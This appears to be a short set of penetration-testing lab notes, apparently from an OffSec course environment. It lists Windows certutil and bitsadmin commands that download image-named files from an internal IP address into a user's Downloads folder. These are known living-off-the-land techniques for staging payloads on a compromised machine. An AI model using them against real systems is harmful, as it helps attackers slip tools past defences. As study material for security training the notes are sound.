certutil -urlcache -split -f http://172.16.68.153/cow.jpg C:\Users\offsec\Downloads\cow.jpg

bitsadmin /create MyDownload
bitsadmin /addfile MyDownload http://172.16.68.153/dragon.gif C:\Users\offsec\Downloads\dragon.gif
bitsadmin /resume MyDownload
bitsadmin /complete MyDownload

certutil -urlcache -split -f http://172.16.68.153/sheep.jpg C:\Users\offsec\Downloads\sheep.jpg
